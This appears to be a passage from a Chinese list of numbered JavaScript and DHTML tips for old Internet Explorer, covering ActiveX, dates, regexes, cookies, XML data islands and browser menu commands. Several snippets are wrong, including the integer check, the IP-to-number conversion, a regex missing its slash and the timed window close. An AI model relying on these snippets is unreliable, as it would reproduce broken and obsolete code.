src=&quot;http://www.51js.com/images/51js/red_forum.gif&quot; border=&quot;0&quot;&gt;&lt;/a&gt;// 137.显示本地计算机信息 var WshNetwork = new ActiveXObject(&quot;WScript.Network&quot;); alert(&quot;Domain = &quot; + WshNetwork.UserDomain); alert(&quot;Computer Name = &quot; + WshNetwork.ComputerName); alert(&quot;User Name = &quot; + WshNetwork.UserName);// 138.比较时间 tDate = new Date(2004,01,08,14,35); //年,月，日，时，分 dDate = new Date(); tDate&lt;dDate?alert(&quot;早于&quot;):alert(&quot;晚于&quot;);// 139.弹出鼠标所在处的链结地址 &lt;body onmouseover=&quot;if (event.srcElement.tagName==&#x27;A&#x27;)alert(event.srcElement.href)&quot;&gt;&lt;a href=&quot;http://51js.com/viewthread.php?tid=13589&quot; &gt;dddd&lt;/a&gt;&lt;input&gt;// 140.注意不能通过与 undefined 做比较来测试一个变量是否存在，虽然可以检查它的类型是否为“undefined”。在以 下的代码范例中，假设程序员想测试是否已经声明变量 x ： // 这种方法不起作用 if (x == undefined) // 作某些操作 // 这个方法同样不起作用- 必须检查 // 字符串 &quot;undefined&quot; if (typeof(x) == undefined) // 作某些操作 // 这个方法有效 if (typeof(x) == &quot;undefined&quot;) // 作某些操作 141.创建具有某些属性的对象 var myObject = new Object(); myObject.name = &quot;James&quot;; myObject.age = &quot;22&quot;; myObject.phone = &quot;555 1234&quot;;// 142.枚举（循环）对象的所有属性 for (var a in myObject) &#123; // 显示 &quot;The property &#x27;name&#x27; is James&quot;，等等。 window.alert(&quot;The property &#x27;&quot; + a + &quot;&#x27; is &quot; + myObject[a]); &#125;// 143.判断一个数字是否是整数 var a=23.2; alert(a%1==1)// 144.新建日期型变量 var a = new Date(2000, 1, 1); alert(a.toLocaleDateString()); 145.给类定义新的方法 function trim_1() &#123; return this.replace(/(^\\s*)|(\\s*$)/g, &quot;&quot;); &#125; String.prototype.trim=trim_1; alert(&#x27;cindy&#x27;.trim()); 146.定义一个将日期类型转化为字符串的方法 function guoguo_date() &#123; var tmp1,tmp2; tmp1 =this.getMonth()+1+&quot;&quot;; if(tmp1.length&lt;2) tmp1=&quot;0&quot;+tmp1; tmp2 =this.getDate()+&quot;&quot;; if(tmp2.length&lt;2) tmp2=&quot;0&quot;+tmp2; return this.getYear()+&quot;-&quot;+tmp1+&quot;-&quot;+tmp2; &#125; Date.prototype.toLiteString=guoguo_date; alert(new Date().toLiteString()) 147. pasta 是有四个参数的构造器,定义对象。 function pasta(grain, width, shape, hasEgg) &#123; // 是用什么粮食做的？ this.grain = grain; // 多宽？（数值） this.width = width; // 横截面形状？（字符串） this.shape = shape; // 是否加蛋黄？（boolean） this.hasEgg = hasEgg; //定义方法 this.toString=aa; &#125; function aa() &#123; ; &#125; //定义了对象构造器后，用 new 运算符创建对象实例。 var spaghetti = new pasta(&quot;wheat&quot;, 0.2, &quot;circle&quot;, true); var linguine = new pasta(&quot;wheat&quot;, 0.3, &quot;oval&quot;, true); //补充定义属性，spaghetti和linguine都将自动获得新的属性 pasta.prototype.foodgroup = &quot;carbohydrates&quot;; 148.打印出错误原因 try &#123; x = y // 产生错误。 &#125; catch(e) &#123; document.write(e.description) //打印 &quot;&#x27;y&#x27; is undefined&quot;. &#125;// 149.生成EXCEL文件并保存 var ExcelSheet; ExcelApp = new ActiveXObject(&quot;Excel.Application&quot;); ExcelSheet = new ActiveXObject(&quot;Excel.Sheet&quot;); //本代码启动创建对象的应用程序（在这种情况下，Microsoft Excel 工作表）。一旦对象被创建，就可以用定义的对象变量在代码中引用它。 在下面的例子中，通过对象变量 ExcelSheet 访问新对象的属性和方法和其他 Excel 对象，包括 Application 对象和 ActiveSheet.Cells 集合。 // 使 Excel 通过 Application 对象可见。 ExcelSheet.Application.Visible = true; // 将一些文本放置到表格的第一格中。 ExcelSheet.ActiveSheet.Cells(1,1).Value = &quot;This is column A, row 1&quot;; // 保存表格。 ExcelSheet.SaveAs(&quot;C:\\\\TEST.XLS&quot;); // 用 Application 对象用 Quit 方法关闭 Excel。 ExcelSheet.Application.Quit();// 150.根据标签获得一组对象 var coll = document.all.tags(&quot;DIV&quot;); if (coll!=null) &#123; for (i=0; i&lt;coll.length; i++) ... &#125;// 151.实现打印预览及打印 &lt;OBJECT classid=&quot;CLSID:8856F961-340A-11D0-A96B-00C04FD705A2&quot; height=0 id=wb name=wb width=0&gt;&lt;/OBJECT&gt; &lt;input type=button value=打印预览 onclick=&quot;wb.execwb(7,1)&quot;&gt; &lt;input type=button onClick=document.all.wb.ExecWB(6,1) value=&quot;打印&quot;&gt;// 152.不通过form，直接通过名字引用对象 &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;gg&quot; value=aaaaa&gt; &lt;SCRIPT&gt; &lt;!-- alert(document.all.gg.value) //--&gt; &lt;/SCRIPT&gt;// 153.使鼠标滚轮失效 function document.onmousewheel() &#123; return false; &#125;// 154.创建弹出窗口 &lt;SCRIPT LANGUAGE=&quot;JScript&quot;&gt; var oPopup = window.createPopup(); var oPopupBody = oPopup.document.body; oPopupBody.innerHTML = &quot;Display some &lt;B&gt;HTML&lt;/B&gt; here.&quot;; oPopup.show(100, 100, 200, 50, document.body); &lt;/SCRIPT&gt;// 155.取得鼠标所在处的对象 var obj = document.elementFromPoint(event.x,event.y);// 156.获得左边的对象 &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;gg&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;bb&quot; onclick=&quot;this.previousSibling.value=&#x27;guoguo&#x27;&quot;&gt;// 157.定位鼠标 document.all.hint_layer.style.left = event.x+document.body.scrollLeft+10; document.all.hint_layer.style.top = event.y+document.body.scrollTop+10;// 158.向下拉框指定位置添加项目 var op = document.createElement(&quot;OPTION&quot;); document.all.selected_items.children(index).insertAdjacentElement(&quot;BeforeBegin&quot;,op); op.text = document.all.all_items.text; op.value = document.all.all_items.value;// 159.判断一个窗口是否已经打开，如果已经打开，则关闭之 var a; if(a) a.close(); else a=window.open(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);// 160.动态创建一个标签 newElem = document.createElement(&quot;DIV&quot;); newElem.id = &quot;hint_layer&quot;; document.body.appendChild(newElem); document.all.hint_layer.innerText=&quot;guoguo&quot;;// 161.标题栏 document.title// 162.背景图片 &lt;body style=&quot;BACKGROUND-ATTACHMENT: fixed&quot; background=&quot;img/bgfix.gif&quot; &gt;&lt;/body&gt;//背景图片不动 &lt;STYLE TYPE=&quot;text/css&quot;&gt; &lt;!-- BODY &#123;background-image:img/bgchild.jpg; background-position: center; background-repeat: no-repeat; background-attachment: fixed;&#125; --&gt; &lt;/STYLE&gt;//背景图片居中 163.设置透明效果 document.form.xxx.filters.alpha.opacity=0～100// 164.定义方法 var dragapproved=false; document.onmouseup=new Function(&quot;dragapproved = false&quot;);// 165.将数字转化为人民币大写形式 function convertCurrency(currencyDigits) &#123; // Constants: var MAXIMUM_NUMBER = 99999999999.99; // Predefine the radix characters and currency symbols for output: var CN_ZERO = &quot;零&quot;; var CN_ONE = &quot;壹&quot;; var CN_TWO = &quot;贰&quot;; var CN_THREE = &quot;叁&quot;; var CN_FOUR = &quot;肆&quot;; var CN_FIVE = &quot;伍&quot;; var CN_SIX = &quot;陆&quot;; var CN_SEVEN = &quot;柒&quot;; var CN_EIGHT = &quot;捌&quot;; var CN_NINE = &quot;玖&quot;; var CN_TEN = &quot;拾&quot;; var CN_HUNDRED = &quot;佰&quot;; var CN_THOUSAND = &quot;仟&quot;; var CN_TEN_THOUSAND = &quot;万&quot;; var CN_HUNDRED_MILLION = &quot;亿&quot;; var CN_SYMBOL = &quot;人民币&quot;; var CN_DOLLAR = &quot;元&quot;; var CN_TEN_CENT = &quot;角&quot;; var CN_CENT = &quot;分&quot;; var CN_INTEGER = &quot;整&quot;; // Variables: var integral; // Represent integral part of digit number. var decimal; // Represent decimal part of digit number. var outputCharacters; // The output result. var parts; var digits, radices, bigRadices, decimals; var zeroCount; var i, p, d; var quotient, modulus; // Validate input string: currencyDigits = currencyDigits.toString(); if (currencyDigits == &quot;&quot;) &#123; alert(&quot;Empty input!&quot;); return &quot;&quot;; &#125; if (currencyDigits.match(/[^,.\\d]/) != null) &#123; alert(&quot;Invalid characters in the input string!&quot;); return &quot;&quot;; &#125; if ((currencyDigits).match(/^((\\d&#123;1,3&#125;(,\\d&#123;3&#125;)*(.((\\d&#123;3&#125;,)*\\d&#123;1,3&#125;))?)|(\\d+(.\\d+)?))$/) == null) &#123; alert(&quot;Illegal format of digit number!&quot;); return &quot;&quot;; &#125; // Normalize the format of input digits: currencyDigits = currencyDigits.replace(/,/g, &quot;&quot;); // Remove comma delimiters. currencyDigits = currencyDigits.replace(/^0+/, &quot;&quot;); // Trim zeros at the beginning. // Assert the number is not greater than the maximum number. if (Number(currencyDigits) &gt; MAXIMUM_NUMBER) &#123; alert(&quot;Too large a number to convert!&quot;); return &quot;&quot;; &#125; // Process the coversion from currency digits to characters: // Separate integral and decimal parts before processing coversion: parts = currencyDigits.split(&quot;.&quot;); if (parts.length &gt; 1) &#123; integral = parts[0]; decimal = parts[1]; // Cut down redundant decimal digits that are after the second. decimal = decimal.substr(0, 2); &#125; else &#123; integral = parts[0]; decimal = &quot;&quot;; &#125; // Prepare the characters corresponding to the digits: digits = new Array(CN_ZERO, CN_ONE, CN_TWO, CN_THREE, CN_FOUR, CN_FIVE, CN_SIX, CN_SEVEN, CN_EIGHT, CN_NINE); radices = new Array(&quot;&quot;, CN_TEN, CN_HUNDRED, CN_THOUSAND); bigRadices = new Array(&quot;&quot;, CN_TEN_THOUSAND, CN_HUNDRED_MILLION); decimals = new Array(CN_TEN_CENT, CN_CENT); // Start processing: outputCharacters = &quot;&quot;; // Process integral part if it is larger than 0: if (Number(integral) &gt; 0) &#123; zeroCount = 0; for (i = 0; i &lt; integral.length; i++) &#123; p = integral.length - i - 1; d = integral.substr(i, 1); quotient = p / 4; modulus = p % 4; if (d == &quot;0&quot;) &#123; zeroCount++; &#125; else &#123; if (zeroCount &gt; 0) &#123; outputCharacters += digits[0]; &#125; zeroCount = 0; outputCharacters += digits[Number(d)] + radices[modulus]; &#125; if (modulus == 0 &amp;&amp; zeroCount &lt; 4) &#123; outputCharacters += bigRadices[quotient]; &#125; &#125; outputCharacters += CN_DOLLAR; &#125; // Process decimal part if there is: if (decimal != &quot;&quot;) &#123; for (i = 0; i &lt; decimal.length; i++) &#123; d = decimal.substr(i, 1); if (d != &quot;0&quot;) &#123; outputCharacters += digits[Number(d)] + decimals; &#125; &#125; &#125; // Confirm and return the final output string: if (outputCharacters == &quot;&quot;) &#123; outputCharacters = CN_ZERO + CN_DOLLAR; &#125; if (decimal == &quot;&quot;) &#123; outputCharacters += CN_INTEGER; &#125; outputCharacters = CN_SYMBOL + outputCharacters; return outputCharacters; &#125;// 166.xml数据岛绑定表格 &lt;html&gt; &lt;body&gt; &lt;xml id=&quot;abc&quot; src=&quot;test.xml&quot;&gt;&lt;/xml&gt; &lt;table border=&#x27;1&#x27; datasrc=&#x27;#abc&#x27;&gt; &lt;thead&gt; &lt;td&gt;接收人&lt;/td&gt; &lt;td&gt;发送人&lt;/td&gt; &lt;td&gt;主题&lt;/td&gt; &lt;td&gt;内容&lt;/td&gt; &lt;/thead&gt; &lt;tfoot&gt; &lt;tr&gt;&lt;th&gt;表格的结束&lt;/th&gt;&lt;/tr&gt; &lt;/tfoot&gt; &lt;tr&gt; &lt;td&gt;&lt;div datafld=&quot;to&quot;&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div datafld=&quot;from&quot;&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div datafld=&quot;subject&quot;&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div datafld=&quot;content&quot;&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; //cd_catalog.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt; &lt;!-- Edited with XML Spy v4.2 --&gt; &lt;CATALOG&gt; &lt;CD&gt; &lt;TITLE&gt;Empire Burlesque&lt;/TITLE&gt; &lt;ARTIST&gt;Bob Dylan&lt;/ARTIST&gt; &lt;COUNTRY&gt;USA&lt;/COUNTRY&gt; &lt;COMPANY&gt;Columbia&lt;/COMPANY&gt; &lt;PRICE&gt;10.90&lt;/PRICE&gt; &lt;YEAR&gt;1985&lt;/YEAR&gt; &lt;/CD&gt; &lt;CD&gt; &lt;TITLE&gt;Hide your heart&lt;/TITLE&gt; &lt;ARTIST&gt;Bonnie Tyler&lt;/ARTIST&gt; &lt;COUNTRY&gt;UK&lt;/COUNTRY&gt; &lt;COMPANY&gt;CBS Records&lt;/COMPANY&gt; &lt;PRICE&gt;9.90&lt;/PRICE&gt; &lt;YEAR&gt;1988&lt;/YEAR&gt; &lt;/CD&gt; &lt;CD&gt; &lt;TITLE&gt;Greatest Hits&lt;/TITLE&gt; &lt;ARTIST&gt;Dolly Parton&lt;/ARTIST&gt; &lt;COUNTRY&gt;USA&lt;/COUNTRY&gt; &lt;COMPANY&gt;RCA&lt;/COMPANY&gt; &lt;PRICE&gt;9.90&lt;/PRICE&gt; &lt;YEAR&gt;1982&lt;/YEAR&gt; &lt;/CD&gt; &lt;CD&gt; &lt;TITLE&gt;Still got the blues&lt;/TITLE&gt; &lt;ARTIST&gt;Gary Moore&lt;/ARTIST&gt; &lt;COUNTRY&gt;UK&lt;/COUNTRY&gt; &lt;COMPANY&gt;Virgin records&lt;/COMPANY&gt; &lt;PRICE&gt;10.20&lt;/PRICE&gt; &lt;YEAR&gt;1990&lt;/YEAR&gt; &lt;/CD&gt; &lt;/CATALOG&gt; // 167.以下组合可以正确显示汉字 ================================ xml保存编码 xml页面指定编码 ANSI gbk/GBK、gb2312 Unicode unicode/Unicode UTF-8 UTF-8 ================================ 168.XML操作 &lt;xml id=&quot;xmldata&quot; src=&quot;/data/books.xml&quot;&gt; &lt;div id=&quot;guoguo&quot;&gt;&lt;/div&gt; &lt;script&gt; var x=xmldata.recordset //取得数据岛中的记录集 if(x.absoluteposition &lt; x.recordcount) //如果当前的绝对位置在最后一条记录之前 &#123; x.movenext(); //向后移动 x.moveprevious(); //向前移动 x.absoluteposition=1; //移动到第一条记录 x.absoluteposition=x.recordcount;//移动到最后一条记录，注意记录集x.absoluteposition是从1到记录集记录的个数的 guoguo.innerText=xmldso.recordset(&quot;field_name&quot;); //从中取出某条记录 &#125; &lt;/script&gt; 169.动态修改CSS的另一种方式 this.runtimeStyle.cssText = &quot;color:#990000;border:1px solid #cccccc&quot;;// 170.正则表达式 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） String.prototype.len=function()&#123;return this.replace([^\\x00-\\xff]/g,&quot;aa&quot;).length;&#125; 匹配空行的正则表达式：\\n[\\s| ]*\\r 字串4 匹配HTML标记的正则表达式：/&lt;(.*)&gt;.*&lt;\\/\\1&gt;|&lt;(.*) \\/&gt;/ 字串3 匹配首尾空格的正则表达式：(^\\s*)|(\\s*$) 字串3 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下： String.prototype.trim = function() &#123; return this.replace(/(^\\s*)|(\\s*$)/g, &quot;&quot;); &#125; ////////利用正则表达式分解和转换IP地址： 下面是利用正则表达式匹配IP地址，并将IP地址转换成对应数值的Javascript程序： 字串5 function IP2V(ip) &#123; re=/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/g //匹配IP地址的正则表达式 if(re.test(ip)) &#123; return RegExp.$1*Math.pow(255,3))+RegExp.$2*Math.pow(255,2))+RegExp.$3*255+RegExp.$4*1 &#125; else &#123; throw new Error(&quot;Not a valid IP address!&quot;) &#125; &#125; 不过上面的程序如果不用正则表达式，而直接用split函数来分解可能更简单，程序如下：var ip=&quot;10.100.20.168&quot; ip=ip.split(&quot;.&quot;) alert(&quot;IP值是：&quot;+(ip[0]*255*255*255+ip[1]*255*255+ip[2]*255+ip[3]*1)) 匹配Email地址的正则表达式：\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* 匹配网址URL的正则表达式：http://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&amp;=]*)? //////////利用正则表达式去除字串中重复的字符的算法程序： var s=&quot;abacabefgeeii&quot; var s1=s.replace(/(.).*\\1/g,&quot;$1&quot;) var re=new RegExp(&quot;[&quot;+s1+&quot;]&quot;,&quot;g&quot;) var s2=s.replace(re,&quot;&quot;) alert(s1+s2) //结果为：abcefgi 思路是使用后向引用取出包括重复的字符，再以重复的字符建立第二个表达式，取到不重复的字符，两者串连。这个方法对于字符顺序有要求的字符串可能不适用。 //////////得用正则表达式从URL地址中提取文件名的javascript程序，如下结果为page1 s=&quot;http://www.9499.net/page1.htm&quot; s=s.replace(/(.*\\/)&#123;0,&#125;([^\\.]+).*/ig,&quot;$2&quot;) alert(s) /////////利用正则表达式限制网页表单里的文本框输入内容： 用正则表达式限制只能输入中文：onkeyup=&quot;value=value.replace(/[^\\u4E00-\\u9FA5]/g,&#x27;&#x27;)&quot; onbeforepaste=&quot;clipboardData.setData(&#x27;text&#x27;,clipboardData.getData(&#x27;text&#x27;).replace(/[^\\u4E00-\\u9FA5]/g,&#x27;&#x27;) )&quot; 用正则表达式限制只能输入全角字符： onkeyup=&quot;value=value.replace(/[^\\uFF00-\\uFFFF]/g,&#x27;&#x27;)&quot; onbeforepaste=&quot;clipboardData.setData(&#x27;text&#x27;,clipboardData.getData(&#x27;text&#x27;).replace(/[^\\uFF00-\\uFFFF]/g,&#x27;&#x27;) )&quot; 用正则表达式限制只能输入数字：onkeyup=&quot;value=value.replace(/[^\\d]/g,&#x27;&#x27;) &quot;onbeforepaste=&quot;clipboardData.setData(&#x27;text&#x27;,clipboardData.getData(&#x27;text&#x27;).replace(/[^\\d]/g,&#x27;&#x27;))&quot; 用正则表达式限制只能输入数字和英文：onkeyup=&quot;value=value.replace(/[\\W]/g,&#x27;&#x27;) &quot;onbeforepaste=&quot;clipboardData.setData(&#x27;text&#x27;,clipboardData.getData(&#x27;text&#x27;).replace(/[^\\d]/g,&#x27;&#x27;))&quot; 171.设置和使用cookie &lt;HTML&gt; &lt;BODY&gt; 设置与读取 cookies...&lt;BR&gt; 写入cookie的值&lt;input type=text name=gg&gt; &lt;INPUT TYPE = BUTTON Value = &quot;设置cookie&quot; onClick = &quot;Set()&quot;&gt; &lt;INPUT TYPE = BUTTON Value = &quot;读取cookie&quot; onClick = &quot;Get()&quot;&gt;&lt;BR&gt; &lt;INPUT TYPE = TEXT NAME = Textbox&gt; &lt;/BODY&gt; &lt;SCRIPT&gt; function Set() &#123; var Then = new Date() Then.setTime(Then.getTime() + 60*1000 ) //60秒 document.cookie = &quot;Cookie1=&quot;+gg.value+&quot;;expires=&quot;+ Then.toGMTString() &#125; function Get() &#123; var cookieString = new String(document.cookie) var cookieHeader = &quot;Cookie1=&quot; var beginPosition = cookieString.indexOf(cookieHeader) if (beginPosition != -1) &#123; document.all.Textbox.value = cookieString.substring(beginPosition + cookieHeader.length) &#125; else document.all.Textbox.value = &quot;Cookie 未找到!&quot; &#125; &lt;/SCRIPT&gt; &lt;/HTML&gt;// 172.取月的最后一天 function getLastDay(year,month) &#123; //取年 var new_year = year; //取到下一个月的第一天,注意这里传入的month是从1～12 var new_month = month++; //如果当前是12月，则转至下一年 if(month&gt;12) &#123; new_month -=12; new_year++; &#125; var new_date = new Date(new_year,new_month,1); return (new Date(new_date.getTime()-1000*60*60*24)).getDate(); &#125;// 173.判断当前的焦点是组中的哪一个 for(var i=0;i&lt;3;i++) if(event.srcElement==bb) break;// 174.实现类 package com.baosight.view.utils; import javax.servlet.jsp.tagext.TagSupport; import javax.servlet.http.HttpSession; public class Mytag extends TagSupport &#123; public int doStartTag() throws javax.servlet.jsp.JspException &#123; boolean canAccess = false; HttpSession session= pageContext.getSession(); if (canAccess) &#123; return EVAL_BODY_INCLUDE; &#125; else &#123; return this.SKIP_BODY; &#125; &#125; &#125; 175.在web.xml中添加定义 &lt;taglib&gt; &lt;taglib-uri&gt;guoguo&lt;/taglib-uri&gt; &lt;taglib-location&gt;/WEB-INF/abc.tld&lt;/taglib-location&gt; &lt;/taglib&gt; 176.标签库中定义abc.tld &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE taglib PUBLIC &quot;-//Sun Microsystems, Inc.//DTD JSP Tag Library 1.1//EN&quot; &quot;http://java.sun.com/j2ee/dtds/web-jsptaglibrary_1_1.dtd&quot;&gt; &lt;taglib&gt; &lt;tlibversion&gt;1.0&lt;/tlibversion&gt; &lt;jspversion&gt;1.1&lt;/jspversion&gt; &lt;shortname&gt;hr&lt;/shortname&gt; &lt;uri&gt;guoguo&lt;/uri&gt; &lt;info&gt;Extra 3 Tag Library&lt;/info&gt; &lt;tag&gt; &lt;name&gt;mytag&lt;/name&gt; &lt;tagclass&gt;com.baosight.view.utils.Mytag&lt;/tagclass&gt; &lt;attribute&gt; &lt;name&gt;id2&lt;/name&gt; &lt;required&gt;true&lt;/required&gt; &lt;rtexprvalue&gt;true&lt;/rtexprvalue&gt; &lt;/attribute&gt; &lt;/tag&gt; &lt;/taglib&gt; 177.在使用自定义标签的页面中加入自己定义的标签， &lt;%@ taglib uri=&quot;guoguo&quot; prefix=&quot;guoguo&quot; %&gt; //自己定义标签 178.显示带边框的集 &lt;fieldset style=&quot;border:1px gray solid;width:100px&quot;&gt; &lt;legend&gt;查询条件&lt;/legend&gt; dfdfdf &lt;/fieldset&gt;// 179.【文件(F)】菜单中的命令的实现 1、〖打开〗命令的实现 [格式]:document.execCommand(&quot;open&quot;) [说明]这跟VB等编程设计中的webbrowser控件中的命令有些相似，大家也可依此琢磨琢磨。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;open&quot;) &gt;打开&lt;/a&gt; 2、〖使用 记事本 编辑〗命令的实现 [格式]:location.replace(&quot;view-source:&quot;+location) [说明]打开记事本，在记事本中显示该网页的源代码。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=location.replace(&quot;view-source:&quot;+location) &gt;使用 记事本编辑&lt;/a&gt; 3、〖另存为〗命令的实现 [格式]:document.execCommand(&quot;saveAs&quot;) [说明]将该网页保存到本地盘的其它目录！ [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;saveAs&quot;) &gt;另存为&lt;/a&gt; 4、〖打印〗命令的实现 [格式]:document.execCommand(&quot;print&quot;) [说明]当然，你必须装了打印机！ [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;print&quot;) &gt;打印&lt;/a&gt; 5、〖关闭〗命令的实现 [格式]:window.close();return false [说明]将关闭本窗口。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=window.close();return false) &gt;关闭本窗口&lt;/a&gt; 180.【编辑(E)】菜单中的命令的实现 〖全选〗命令的实现 [格式]:document.execCommand(&quot;selectAll&quot;) [说明]将选种网页中的全部内容！ [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;selectAll&quot;) &gt;全选&lt;/a&gt; 181.【查看(V)】菜单中的命令的实现 1、〖刷新〗命令的实现 [格式]:location.reload() 或 history.go(0) [说明]浏览器重新打开本页。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=location.reload()&gt;刷新&lt;/a&gt; 或加入: &lt;a href=&quot;###&quot; onclick=history.go(0)&gt;刷新&lt;/a&gt; 2、〖源文件〗命令的实现 [格式]:location.replace(&quot;view-source:&quot;+location) [说明]查看该网页的源代码。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=location.replace(&quot;view-source:&quot;+location)&gt;查看源文件&lt;/a&gt; 3、〖全屏显示〗命令的实现 [格式]:window.open(document.location, &quot;url&quot;, &quot;fullscreen&quot;) [说明]全屏显示本页。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=window.open(document.location,&quot;url&quot;,&quot;fullscreen&quot;)&gt;全屏显示&lt;/a&gt; 182.【收藏(A)】菜单中的命令的实现 1、〖添加到收藏夹〗命令的实现 [格式]:window.external.AddFavorite(&#x27;url&#x27;, &#x27;“网站名”) [说明]将本页添加到收藏夹。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;javascript:window.external.AddFavorite(&#x27;http://oh.jilinfarm.com&#x27;, &#x27;胡明新的个人主页&#x27;)&quot;&gt;添加到收藏夹&lt;/a&gt; 2、〖整理收藏夹〗命令的实现 [格式]:window.external.showBrowserUI(&quot;OrganizeFavorites&quot;,null) [说明]打开整理收藏夹对话框。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=window.external.showBrowserUI(&quot;OrganizeFavorites&quot;,null)&gt;整理收藏夹&lt;/a&gt; 183.【工具(T)】菜单中的命令的实现 〖internet选项〗命令的实现 [格式]:window.external.showBrowserUI(&quot;PrivacySettings&quot;,null) [说明]打开internet选项对话框。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=window.external.showBrowserUI(&quot;PrivacySettings&quot;,null)&gt;internet选项&lt;/a&gt; 184.【工具栏】中的命令的实现 1、〖前进〗命令的实现 [格式]history.go(1) 或 history.forward() [说明]浏览器打开后一个页面。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=history.go(1)&gt;前进&lt;/a&gt; 或加入: &lt;a href=&quot;###&quot; onclick=history.forward()&gt;前进&lt;/a&gt; 2、〖后退〗命令的实现 [格式]:history.go(-1) 或 history.back() [说明]浏览器返回上一个已浏览的页面。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=history.go(-1)&gt;后退&lt;/a&gt; 或加入: &lt;a href=&quot;###&quot; onclick=history.back()&gt;后退&lt;/a&gt; 3、〖刷新〗命令的实现 [格式]:document.reload() 或 history.go(0) [说明]浏览器重新打开本页。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=location.reload()&gt;刷新&lt;/a&gt; 或加入: &lt;a href=&quot;###&quot; onclick=history.go(0)&gt;刷新&lt;/a&gt; 185.其它命令的实现 〖定时关闭本窗口〗命令的实现 [格式]:settimeout(window.close(),关闭的时间) [说明]将关闭本窗口。 [举例]在&lt;body&gt;&lt;/body&gt;之间加入： &lt;a href=&quot;###&quot; onclick=settimeout(window.close(),3000)&gt;3秒关闭本窗口&lt;/a&gt; 【附】为了方便读者，下面将列出所有实例代码，你可以把它们放到一个html文件中，然后预览效果。 &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;open&quot;)&gt;打开&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=location.replace(&quot;view-source:&quot;+location)&gt;使用 记事本编辑&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;saveAs&quot;)&gt;另存为&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;print&quot;)&gt;打印&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=window.close();return false)&gt;关闭本窗口&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=document.execCommand(&quot;selectAll&quot;)&gt;全选&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=location.reload()&gt;刷新&lt;/a&gt; &lt;a href=&quot;###&quot; onclick=history.go(0)&gt;刷新&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=location.replace(&quot;view-source:&quot;+location)&gt;查看源文件&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=window.open(document.location,&quot;url&quot;,&quot;fullscreen&quot;)&gt;全屏显示&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;javascript:window.external.AddFavorite(&#x27;http://homepage.yesky.com&#x27;, &#x27;天极网页陶吧&#x27;)&quot;&gt;添加到收藏 夹&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=window.external.showBrowserUI(&quot;OrganizeFavorites&quot;,null)&gt;整理收藏夹&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=window.external.showBrowserUI(&quot;PrivacySettings&quot;,null)&gt;internet选项&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=history.go(1)&gt;前进1&lt;/a&gt; &lt;a href=&quot;###&quot; onclick=history.forward()&gt;前进2&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=history.go(-1)&gt;后退1&lt;/a&gt; &lt;a href=&quot;###&quot; onclick=history.back()&gt;后退2&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;###&quot; onclick=settimeout(window.close(),3000)&gt;3秒关闭本窗口&lt;/a&gt;&lt;br&gt; 186.给DHTML中的标签添加一个新的属性，可以随意加 &lt;BODY onload=&quot;alert(a1.epass)&quot;&gt; &lt;input type=text name=&quot;a1&quot; epass=&quot;zhongguo&quot;&gt; &lt;/BODY&gt;// 188.服务器端通过request.getReader()获得传入的字符串 